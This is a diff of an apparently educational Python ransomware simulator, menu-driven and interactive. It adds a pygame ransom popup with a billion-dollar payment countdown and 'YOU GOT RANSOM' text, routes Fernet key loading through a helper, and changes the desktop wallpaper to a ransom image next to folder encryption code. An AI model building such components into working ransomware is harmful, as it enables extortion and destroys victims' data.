@@ -11,10 +11,27 @@ import datetime
 from tqdm import tqdm
 import ctypes
 from tkinter import messagebox
+import pygame
+import time
 
 ENCRYPT              = 0
 DECRYPT              = 1
+# WALLPAPER_PATH     = r"C:\Users\35193\Documents\ransom.png"
+WALLPAPER_PATH       = "ransom2.png" 
 SPI_SETDESKWALLPAPER = 20
+
+# window dimensions
+WINDOW_WIDTH  = 1000
+WINDOW_HEIGHT = 800
+
+# colors
+WHITE  = (255, 255, 255)
+BLACK  = (0, 0, 0)
+RED    = (255, 0, 0)
+YELLOW = (255,255,0)
+
+# countdown
+COUNTDOWN = 10000000
 
 
 ### funtions
@@ -33,6 +50,29 @@ def write_key():
 # Return       : The key read from the file
 def load_key():
     return open("key","rb").read()
+
+# Function name: get_key
+# Purpose      : get the key
+# Arguments    : none
+# Return       : The key returned by load_key() function
+def get_key():
+    try:
+        return load_key()
+    except FileNotFoundError:
+        write_key()
+        return load_key()
+    except:
+        print("\n ----- An unexpected error occured during a load key -----\n")
+
+# Function name: want_to_compress
+# Purpose      : Asks the user if he/she/other want to compress
+# Arguments    : file_path
+# Return       : none
+def want_to_compress(file_path):
+    user_answer = input("\nDo you want to compressed the file to an archive? (y/n)\n")
+    if user_answer.lower() == 'y':
+        return True
+
 
 # Function name: encrypt_file
 # Purpose      : Encrypts a file
@@ -113,9 +153,109 @@ def encrypt_decrypt_folder(folder_path,fernet,value):
 # Return       : none  
 # it would be more correctly if I have an argument that specifiy the path to the picture; it was just a matter of simplicity
 def alter_desktop_wallpaper():
-    wallpaper_path = r"C:\Users\35193\Documents\ransom.png"
-    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, wallpaper_path, 0)
+    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, WALLPAPER_PATH, 0)
+
+# Function name: message_box
+# Purpose      : create a message box 
+# Arguments    : message, letter_color, background_color, font_size, width_location, height_location
+# Return       : none  
+def message_box(window_surface, message,letter_color,background_color,font_size,width_location,height_location):
+    # Create a message box with text
+    # Set the font and size for the message box
+    font = pygame.font.Font(None, font_size)
+    message_box = font.render(message, True, letter_color, background_color)
+    message_box_rect = message_box.get_rect(center=(width_location, height_location))
+    window_surface.blit(message_box, message_box_rect)
+
+
+# Function name: image
+# Purpose      : load an image and draw the image on the window surface
+# Arguments    : window_surface, image, width_location, height_location
+# Return       : none 
+def image(window_surface, image,width_location,height_location):
+    # Load image
+    image = pygame.image.load('ransom2.png')
+
+    # Get image dimensions
+    image_rect = image.get_rect(center=(width_location,height_location))
     
+    # Draw image on the window surface
+    window_surface.blit(image, image_rect)
+
+# Function name: update_time_message
+# Purpose      : update the time that will be displayed on the window surface
+# Arguments    : window_surface, hours, minutes, seconds, letter_color
+# Return       : none 
+def update_time_message(window_surface,hours,minutes,seconds,letter_color):
+        # Define the text time with time left information
+    time_lines = [
+        "Payment of 1,000,000,000.00$ will be raised on",
+        "01/05/2023",
+        "Time left",
+        "{} hours, {} minutes, {} seconds".format(hours, minutes, seconds)
+    ]
+    
+    pygame.draw.rect(window_surface, RED, (0, 450, WINDOW_WIDTH, 600))
+    
+    # Render each line of the text message with the font
+    fonts = [pygame.font.Font(None, 36), pygame.font.Font(None, 36), pygame.font.Font(None, 28), pygame.font.Font(None, 28)]
+    text_surfaces = [font.render(line, True, letter_color) for font, line in zip(fonts, time_lines)]
+
+    # Get the rectangles for each text surface and center them horizontally in the window
+    text_rects = [surface.get_rect(center=(WINDOW_WIDTH/2, 500+50*i)) for i, surface in enumerate(text_surfaces)]
+
+
+    # Blit each text surface onto the window surface
+    for surface, rect in zip(text_surfaces, text_rects):
+        window_surface.blit(surface, rect)
+
+# Function name: ransomware_popup
+# Purpose      : popup a ransomware window
+# Arguments    : none
+# Return       : none 
+def ransomware_popup():
+    # Initialize Pygame
+    pygame.init()
+
+    # Create a surface for the window
+    window_surface = pygame.display.set_mode((WINDOW_WIDTH, WINDOW_HEIGHT))
+
+    # Set the window title
+    pygame.display.set_caption('Ransomware Window')
+
+    # Fill the background color
+    window_surface.fill(RED)
+
+    # Set the time for the countdown
+    countdown_time = COUNTDOWN
+
+    # Set the start time for the countdown
+    start_time = time.time()
+
+    message_box(window_surface,'(: !!!! YOU GOT RANSOM !!!! :)',BLACK,RED,48,WINDOW_WIDTH/2,30)
+    image(window_surface,'ransom2.png',WINDOW_WIDTH/2,260)
+
+    # Run the game loop
+    while True:
+        # Check for events
+        for event in pygame.event.get():
+            if event.type == pygame.QUIT:
+                # Quit the game
+                pygame.quit()
+                quit()
+
+        # Calculate the time remaining for the countdown
+        time_remaining = countdown_time - int(time.time() - start_time)
+        hours = time_remaining // 3600
+        minutes = (time_remaining % 3600) // 60
+        seconds = time_remaining % 60
+
+        update_time_message(window_surface, hours,minutes,seconds,BLACK)
+
+        # Update the display
+        pygame.display.update()
+
+
 ########## Functions from https://www.thepythoncode.com/article/compress-decompress-files-tarfile-python ############
 def compress(tar_file, members):
     """
@@ -161,16 +301,9 @@ def decompress(tar_file, path, members=None):
     # close the file
     tar.close()
 #####################################################################################################################
-
-
+        
 # main
-try:
-    key = load_key()
-except FileNotFoundError:
-    write_key()
-    key = load_key()
-except:
-    print("\n ----- An unexpected error occured during a load key -----\n")
+key = get_key()
 
 # initialize the Fernet class
 fernet = Fernet(key)
@@ -225,15 +358,15 @@ while(True):
             alter_desktop_wallpaper()
         
         case "8":
-            messagebox.showinfo("Ransom ALERT", "You've been hacked")
-        
+            #messagebox.showinfo("Ransom ALERT", "You've been hacked")
+            ransomware_popup()
         case "q":
             break
 
         case _:
             print("\n ----- You do not entered a correct option. Try again -----\n")
             
-            
+
 ### REFERENCES
 # https://www.geeksforgeeks.org/encrypt-and-decrypt-files-using-python/
 # https://www.thepythoncode.com/article/encrypt-decrypt-files-symmetric-python
